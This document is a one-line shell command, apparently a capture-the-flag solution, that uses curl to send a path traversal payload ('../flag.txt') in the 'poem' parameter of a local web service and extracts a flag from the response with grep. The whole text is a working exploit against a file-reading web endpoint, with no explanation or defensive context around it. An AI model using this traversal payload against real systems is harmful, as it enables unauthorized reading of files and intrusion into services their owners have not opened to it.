curl -s 'http://localhost:8192/poems/?poem=../flag.txt' | grep -Eo 'flag{.*}'
